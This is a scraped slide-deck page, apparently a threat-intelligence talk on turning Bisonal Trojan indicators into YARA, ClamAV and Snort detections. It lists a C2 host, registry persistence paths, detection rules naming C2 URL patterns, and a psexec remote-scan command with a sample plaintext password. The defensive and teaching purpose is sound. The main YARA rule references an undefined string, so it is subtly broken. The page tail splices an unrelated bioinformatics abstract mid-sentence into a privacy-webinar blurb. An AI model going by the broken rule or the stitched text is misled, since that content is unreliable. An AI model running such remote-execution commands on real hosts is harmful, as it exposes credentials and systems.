2.0.50727;\n.NET CLR 3.0.04.506.648;.NET CLR 3.5.21002)\nHost: necnec.dns04.com\nConnection: Keep-Alive\n ","Trojan.Bisonal resulting AIOC description\no Type of malware: Modular Trojan (single stage), mainly used for data stealing\no Capabilities: beaconing, listing and controlling processes, creating and deleting files, creating\nremote shells, downloading and executing files\no Dissemination strategy: via Dropper or email attachment\no Architecture: Client / Server using public C2s\no Type of communication: HTTP protocol (in general it uses TCP/80 and TCP/443, but port can be\ncustomized)\no Related Adversary: HeartBeat APT Group (Chinese)\no Earlier Adversary detection: November 2009 (South Korea - TrendMicro)\no Area of operation: actually limited to Asia (including Russia)\no Recorded targets: Mitsubishi Heavy Industries, NEC Corp, Nippon Steel Corp, IHI Corp, several\nMinistries in Japan and South Korea.\no Type of AIOCs developed: Yara rules for files, Yara rules for PCAPs, ClamAV rules, Snort Rule,\nRegistry and logs.\n17\n ","Bisonal Behavior\n Sample: 918a78b49397b17da48f37206fa7801b11d410ea6faa755d0aa27872c7e84c74\n set registry value\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionRun value: dfea data: C:Windowstasksdfea.exe\n key: C:UsersAdminAppDataLocalTempchrome.exe\n C:WindowsTaskstaskeng.exe\nCreated files IOCs\n ","YARA RULES\nrule Trojan.Bisonal {\nstrings:\n$s1 = \"wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo\" wide ascii\n$s2 = \"defa\" wide ascii\n$s3 = \"love a meng\" wide ascii\n$s4 = \"HE@L-PShellE\" wide ascii\n$s5 = \"xecut\"\n$s6 = \"wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo\" wide ascii\n$s7 = \"http://%s/%s.asp?id=%s%s%s\"\n$s8 = \"http://%s/a.asp?id=%s%s\"\n$s9 = \"c:a1.txt“\ncondition:\n($s1 and $s2) or ($s2 and $s3) or ($s4 and $5) and ($s6 and $s7 and $s8 and $s9) and\n// MZ signature at offset 0 and ...\nuint16(0) == 0x5A4D and\n// ... PE signature at offset stored in MZ header at 0x3C\nuint32(uint32(0x3C)) == 0x00004550\n}\nTrojan.Bisonal family\nthe first two strings are\ncommon to other Bisonal\nsamples, but not all.\nThe latest samples contain different\nstrings, except for $s6 string which is\nvery similar to the first string in\nconditition $s1.\nThese strings match a Bisonal sample\nthat uses a common obfuscation\ntechniques(split a word in more\nlines).\nBeyond the common string “defa” the\nsamples of bisonal present different\nstring.\n19\n "," Flag:727x\n Flag:1223\n Flag:8080\n Flag:84d\n nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignB {\nstrings:\n$s00 = \"Flag:84d\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignC {\nstrings:\n$s00 = \"flag:boat\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignD {\nstrings:\n$s00 = \"Flag:d2\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignE {\nstrings:\n$s00 = \"Flag:dick\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignF {\nstrings:\n$s00 = \"flag:ihi\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignW {\nstrings:\n$s00 = \"Flag:qqq\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nTo develop AIOCs from atomic\nindicators we need to\nincorporate «actionable»\nelements that link the malware\nto a specific actor and\ncampaign...\nThis Yara can be\napplied to PCAPs\n20\n ","Why ClamAV for AIOCs?\n21\n ","22\nClam AV: Intro\n• ClamAV is an open source and free anti-virus program.\n• ClamAV runs on Windows (ClamWin), Linux, BSD, Solaris, and Mac OS X, and its\nmainly designed to scan email attachment, but it can be used as a regular anti-\nvirus.\n• ClamAV includes:\n• Features\n• Can search archives\n• Can search multiple file types\n• Multithreaded\n Clamscan\n Clamdscan/Clamd\n Freshclam\nCommand line virus scanner\nClient/Server virus scanner\ntool to update the virus definition database\n ","23\nYARA Rules, AIOCs and ClamAV\n• Yara is the swiss army knife for any low-cost triage and can be applied to many\nendpoint forensic platforms.\n• Values that work across multiple platforms\n• Text strings\n• Hex values that are in multiple versions of the binary\n• ClamAV provides combination of both worlds.\n• By empowering ClamAV with Yara rules, we are able to run massive triage on almost all type\nof system using AIOCs we have developed.\n ","Using ClamAV to Scan for Badness\nclamscan --infected --recursive --allmatch –archive\n-verbose --database ./{yara sigs}.yara {starting directory} |\ntee clamav_{date}_yara\nclamscan --infected --recursive --allmatch --archive-verbose\n--database ./{clamav sigs}.ldb {starting directory} | tee\nclamav_{date}_sigs\n24\n ","Using ClamAV: Results Custom Rules - ClamAV\n● Multiple hits on the same file helps to verify results\n/kswapd0: cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND\n/kswapd0: cpuminer_generic.UNOFFICIAL FOUND\n/kswapd0: cpuminer_v2.3.3_102917_64bit.UNOFFICIAL FOUND\n/kswapd0: cpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND\n/kswapd0!(0): cpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND\n/minerd: minerd_cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND\n/minerd: cpuminer_generic.UNOFFICIAL FOUND\n/minerd!(0): cpuminer_generic.UNOFFICIAL FOUND\n/yam: yam_cpuminer_64bit.UNOFFICIAL FOUND\n/yam!(0): yam_cpuminer_64bit.UNOFFICIAL FOUND\n/gcc: XMRig_v2.3.1.UNOFFICIAL FOUND\n/gcc!(0): YARA.monero.UNOFFICIAL FOUND\nconfig.json: YARA.monerohashcom.UNOFFICIAL FOUND\nconfig.json!(0): YARA.monerohashcom.UNOFFICIAL FOUND\noutfile: YARA.stratum.UNOFFICIAL FOUND\noutfile: FOUND\n26\n ","Sigtool: ClamAV command line\n27\nSigtool\n(signature and database\nmanagement tool)\nSignature using the hash of\nthe PE-section of an\nexecutable\nSignature using full MD5\nhash of file\nSignature using the a hex\nfragment of a file\n ","C:Documents and SettingsuserDesktop\u003e sigtool --md5 malware.exe \u003e\u003e sigFile.hdb\nC:Documents and SettingsuserDesktop\u003etype sigFile.hdb\nB4619d8058362b38d20480c14d30c209:40500:malware.exe\nC:Documents and SettingsuserDesktop\u003e sigtool --mdb malware.exe.text.dat \u003e\u003e\nsigFile.mdb\n• To create a unique signature for an executable file we use the --md5 option of\nsigtool, and then save the output into a file with a “.hdb” extension.\n• To create a signature that will match a particular PE section (typically the sections are\nlabelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save\nthe output into a “.mdb” file. The easiest way to generate MD5 based section signatures is\nto extract target PE sections into separate files.\nSigtool: Command explained\n28\n ","C:Documents and SettingsuserDesktop\u003e echo I am malware | sigtool --hex-dump\n4920616d2061206d616c77617265200d0a\nC:Documents and SettingsuserDesktop\u003e echo\ntestSig:0:*:4920616d2061206d616c77617265200d0a \u003e\u003e sigFile.ndb\n• The last method is to use Body-based signatures in an hexadecimal format.\nIt relies on extracted strings from the body of the file.\n• In the next example we create an hex dump of the string “I am malware”.\n• Next we save the signature that has the format called “Extended Signature”:\nMalwareName:TargetType:Offset:HexSignature and redirect the\noutput to a file “.ndb”.\nSigtool: Command explained\n29\n ","Generating ClamAV Signatures with IDA with CASC\n● ClamAV Signature Creator (CASC)\n● How to use it:\nhttps://github.com/Cisco-Talos/CASC/wiki\nOpen binary in IDA and select Strings Window\nRight click and select add string\n1\nSelect text2\n3\n30\n ","Generating ClamAV Signatures with IDA with CASC\n• Select signature(s) and hit “Create ClamAV Signature” button on the ClamAV Signature Creator view.\n• In the popup, find the signature and save to file\nNote: Make sure the extension is ldb\n4\n5\n31\n ","Remote ClamAV scan with Psexec\n Psexec can execute remote commands\nand so start the scan on every computer\nof a network.\n To use Psexec, the user must have rights\nto access the filesystem of the target\ncomputer.\n\u003e psexec 192.168.81.128 -u administrator -p p4ssw0rd1! actors.\n• The adoption of this methodology can positively impact investigation and triage, but also\nimproves knowledge of the tools and strategies adopted by the adversaries.\n• The formalization process behind it can facilitate the exchange of information and\nindicators without the risk of unintentional leakage of sensitive information and, in short,\nstrengthen the proactive and reactive d...","isSavedByCurrentUser":false,"pageCount":10,"score":0,"slideshowId":"282823381","sourceName":"LATEST","strippedTitle":"optimizing-bioinformatics-applications-a-novel-approach-with-human-protein-data-and-data-mining-techniques","extension":"pdf","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/6126316-250901014508-0e4222b7-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"Biomedicine plays a crucial role in medical research, particularly in optimizing techniques for disease prediction. However, selecting effective optimization methods and managing vast amounts of medical data pose significant challenges. This study introduces a novel optimization technique, integrated bioinformatics optimization model (IBOM) for disease diagnosis, incorporating data mining to efficiently store large datasets for future analysis. Various optimization algorithms, such as whale optimization algorithm (WOA), multi-verse optimization (MVO), genetic algorithm (GA), and ant colony optimization (ACO), were compared with the proposed method. The evaluation focused on metrics like accuracy, specificity, sensitivity, precision, F-score, error, receiver operating characteristic (ROC), and false positive rate (FPR) using 5-fold cross validation. Results indicated that the 5-fold cross-validation method achieved superior performance with metrics: 98.61% accuracy, 96.59% specificity, 88.63% sensitivity, 99.30% precision, 92.31% F-score, 10.80% error, 92.61% ROC, and a 3.00% FPR. global data protection regulations continue to evolve, data minimization has emerged as a cornerstone principle in ensuring privacy compliance and reducing organizational risk. Therefore, privacy professionals must learn how to assess data necessity, engage stakeholders in minimizing data exposure, and maintain compliance with data privacy laws and emerging global standards. \n\nJoin us for an insightful webinar designed to equip privacy, IT, security, and compliance professionals with practical strategies for implementing Privacy by Design and effective data minimization principles. This session will explore how to embed privacy proactively into systems and processes, reduce unnecessary data collection, and align data practices with regulatory expectations.\n\nWe’re excited to feature ManpowerGroup who will share their organization’s real-world journey toward implementing effective data minimization strategies, highlighting key lessons learned and measurable impacts.\n\nThis webinar will review:\n- Clear definitions and legal foundations of data minimization under GDPR, CPRA, and other key regulations\n- Practical techniques for identifying and reducing unnecessary data collection and storage\n- Tools and frameworks for integrating data minimization into privacy impact assessments (PIAs) and data inventories\n- Guidance on setting retention limits
